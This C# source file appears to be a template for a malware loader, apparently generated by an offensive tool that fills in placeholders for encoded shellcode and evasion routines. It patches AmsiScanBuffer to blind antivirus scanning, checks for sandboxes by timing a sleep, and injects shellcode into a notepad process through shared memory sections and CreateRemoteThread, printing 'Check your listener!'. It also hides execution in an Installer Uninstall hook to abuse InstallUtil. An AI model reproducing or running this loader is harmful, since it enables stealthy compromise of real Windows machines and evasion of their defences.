using System;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Configuration.Install;
using System.Text;

namespace Laicy
{
    class Program
    {
        // FOR DEBUGGING
        [DllImport("kernel32.dll")]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("msvcrt.dll", CallingConvention = CallingConvention.Cdecl)]
        static extern int memcmp(byte[] b1, byte[] b2, long count);

        static bool ByteArrayCompare(byte[] b1, byte[] b2)
        {
            return b1.Length == b2.Length && memcmp(b1, b2, b1.Length) == 0;
        }
        // END DEBUGGING

        public const uint ProcessAllFlags = 0x001F0FFF;
        public const uint GenericAll = 0x10000000;
        public const uint PageReadWrite = 0x04;
        public const uint PageReadExecute = 0x20;
        public const uint PageReadWriteExecute = 0x40;
        public const uint SecCommit = 0x08000000;

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern UInt32 NtCreateSection(ref IntPtr SectionHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes, ref UInt32 MaximumSize,
            UInt32 SectionPageProtection, UInt32 AllocationAttributes, IntPtr FileHandle);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, IntPtr CommitSize,
            out ulong SectionOffset, out uint ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);

        [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
        static extern int NtClose(IntPtr hObject);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

		static void cleaning()
        {
            // all credits to https://rastamouse.me/memory-patching-amsi-bypass/
            var modules = Process.GetCurrentProcess().Modules;
            var hAmsi = IntPtr.Zero;

            foreach (ProcessModule module in modules)
            {
                if (module.ModuleName == "amsi.dll")
                {
                    hAmsi = module.BaseAddress;
                    Console.WriteLine("Found isma");
                    break;
                }
            }
            if (hAmsi == IntPtr.Zero)
            {
                return;
            }
            else
            {
                var asb = GetProcAddress(hAmsi, "AmsiScanBuffer");
                var garbage = Encoding.UTF8.GetBytes("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA");

                VirtualProtect(asb, (UIntPtr)garbage.Length, 0x40, out uint oldProtect);

                Marshal.Copy(garbage, 0, asb, garbage.Length);

                VirtualProtect(asb, (UIntPtr)garbage.Length, oldProtect, out uint _);

                Console.WriteLine("Patched");
            }
        }
		
		static bool buy_in()
        {
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return false;
            }

            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return false;
            }

            return true;
        }

        public static void Main()
        {
			
			!!!_AVEVASION_MARK!!!  

            !!!_SHELLCODE_MARK!!!
			
			!!!DECODE_ROUTINE!!!

            int len = buf.Length;
            uint uLen = (uint)len;

            // Get a handle on the local process
            IntPtr lHandle = Process.GetCurrentProcess().Handle;
            Console.WriteLine($"Got handle {lHandle} on local process.");

            // Grab the right PID
            string targetedProc = "notepad"; //change :)
            int procId = Process.GetProcessesByName(targetedProc).First().Id;

            // Get a handle on the remote process
            IntPtr pHandle = OpenProcess(ProcessAllFlags, false, procId);
            Console.WriteLine($"Got handle {pHandle} on PID {procId} ({targetedProc}).");

            // Create a RWX memory section with the size of the payload using 'NtCreateSection'
            IntPtr sHandle = new IntPtr();
            long cStatus = NtCreateSection(ref sHandle, GenericAll, IntPtr.Zero, ref uLen, PageReadWriteExecute, SecCommit, IntPtr.Zero);
            Console.WriteLine($"Created new shared memory section with handle {sHandle}. Success: {cStatus == 0}.");

            // Map a view of the created section (sHandle) for the LOCAL process using 'NtMapViewOfSection'
            IntPtr baseAddrL = new IntPtr();
            uint viewSizeL = uLen;
            ulong sectionOffsetL = new ulong();
            long mStatusL = NtMapViewOfSection(sHandle, lHandle, ref baseAddrL, IntPtr.Zero, IntPtr.Zero, out sectionOffsetL, out viewSizeL, 2, 0, PageReadWrite);
            Console.WriteLine($"Mapped local memory section with base address {baseAddrL} (viewsize: {viewSizeL}, offset: {sectionOffsetL}). Success: {mStatusL == 0}.");

            // Map a view of the same section for the specified REMOTE process (pHandle) using 'NtMapViewOfSection'
            IntPtr baseAddrR = new IntPtr();
            uint viewSizeR = uLen;
            ulong sectionOffsetR = new ulong();
            long mStatusR = NtMapViewOfSection(sHandle, pHandle, ref baseAddrR, IntPtr.Zero, IntPtr.Zero, out sectionOffsetR, out viewSizeR, 2, 0, PageReadExecute);
            Console.WriteLine($"Mapped remote memory section with base address {baseAddrR} (viewsize: {viewSizeR}, offset: {sectionOffsetR}). Success: {mStatusR == 0}.");

            // Copy shellcode to locally mapped view, which will be reflected in the remote mapping
            Marshal.Copy(buf, 0, baseAddrL, len);
            Console.WriteLine($"Copied shellcode to locally mapped memory at address {baseAddrL}.");

            // DEBUG: Read memory at remote address and verify it's the same as the intended shellcode
            byte[] remoteMemory = new byte[len];
            IntPtr noBytesRead = new IntPtr();
            bool result = ReadProcessMemory(pHandle, baseAddrR, remoteMemory, remoteMemory.Length, out noBytesRead);
            bool sameSame = ByteArrayCompare(buf, remoteMemory);
            Console.WriteLine($"DEBUG: Checking if shellcode is correctly placed remotely...");
            if (sameSame != true)
            {
                Console.WriteLine("DEBUG: NOT THE SAME! ABORTING EXECUTION.");
                return;
            }
            else
            {
                Console.WriteLine("DEBUG: OK.");
            }
            // END DEBUG

            // Execute the remotely mapped memory using 'CreateRemoteThread' (EWWW high-level APIs!!!)
            if (CreateRemoteThread(pHandle, IntPtr.Zero, 0, baseAddrR, IntPtr.Zero, 0, IntPtr.Zero) != IntPtr.Zero)
            {
                Console.WriteLine("Injection done! Check your listener!");
            }
            else
            {
                Console.WriteLine("Injection failed!");
            }

            // Unmap the locally mapped section view using 'NtUnMapViewOfSection'
            uint uStatusL = NtUnmapViewOfSection(lHandle, baseAddrL);
            Console.WriteLine($"Unmapped local memory section. Success: {uStatusL == 0}.");

            // Close the section
            int clStatus = NtClose(sHandle);
            Console.WriteLine($"Closed memory section. Success: {clStatus == 0}.");
        }
		[System.ComponentModel.RunInstaller(true)]
		public class Sample : System.Configuration.Install.Installer
		{
			public override void Uninstall(System.Collections.IDictionary savedState)
			{
				Program.Main();
			}
		}
    }
}
